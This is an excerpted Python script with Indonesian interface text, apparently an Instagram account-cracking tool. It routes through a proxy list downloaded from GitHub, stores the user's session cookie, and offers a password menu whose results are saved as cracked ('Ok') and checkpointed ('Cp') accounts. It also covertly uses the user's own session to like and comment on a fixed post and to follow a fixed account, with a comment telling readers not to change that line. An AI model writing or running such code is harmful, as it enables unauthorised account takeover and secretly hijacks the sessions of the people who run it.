...
try:
    ...
    __sep = requests.get('https://raw.githubusercontent.com/LanangAkira/Ngehek/main/Data/proxy3.txt').text
...
def ___login___():
    ...
    try:
        ...
        open('Cookie.txt','w').write(___cookie___)
...
def ___cookies___():
    try:
        ___cookie___ = open('Cookie.txt','r').read()
    except (IOError):
        print("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M));sleep(2)
        ___login___()
    try:
        ___cok = ___cookie___.split('sessionid=')[1]; ___kuki = ___cok.split(';')[0]
        ___teks = random.choice(['Anjay Ganteng 😍','Buset Mantap 😍','Wih GG😁','Mantap Bang 😘','Wibu Bang? 🤔','Salam Kenal Bang 🤗'])
        ...
        ___rex = ses.post('https://www.instagram.com/web/likes/2680630400027268287/like/',headers=____head).text
        ___rex2 = ses.post('https://www.instagram.com/web/friendships/4748061916/follow/',headers=____head).text # Jangan Di Ubah!
        ___rex3 = ses.post('https://www.instagram.com/web/comments/2680630400027268287/add/',headers=____head,data=___data).text
        if '"status":"ok"' in str(___rex):
            print("%s[%s*%s]%s Login Berhasil"%(P,H,P,H));sleep(2)
            ___menu___()
        else:
            print("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M));sleep(2)
            os.system('rm -rf Cookie.txt');___login___()
    except (KeyError):
        os.system('rm -rf Cookie.txt');exit("%s[%s!%s]%s Cookie Error"%(P,M,P,M))
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
# Daftar Menu
def ___menu___():
    ...
    try:
        ...
        os.system('rm -rf Cookie.txt');sleep(2)
        ___login___()
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(P,K,P,K))
    ...
    if ___menu___ in ['1','01']:
       ...
       ___password___()
        ...
        print("\n%s[%s1%s]%s Lihat Hasil Hasil/Ok.txt"%(B,P,B,P))
        print("%s[%s2%s]%s Lihat Hasil Hasil/Cp.txt"%(B,P,B,P))
...
def ___password___():
    ...
    print("\n%s[%s•%s]%s Hasil Ok Tersimpan Di :%s Hasil/Ok.txt"%(B,P,B,P,H))
    print("%s[%s•%s]%s Hasil Cp Tersimpan Di :%s Hasil/Cp.txt\n"%(B,P,B,P,K))
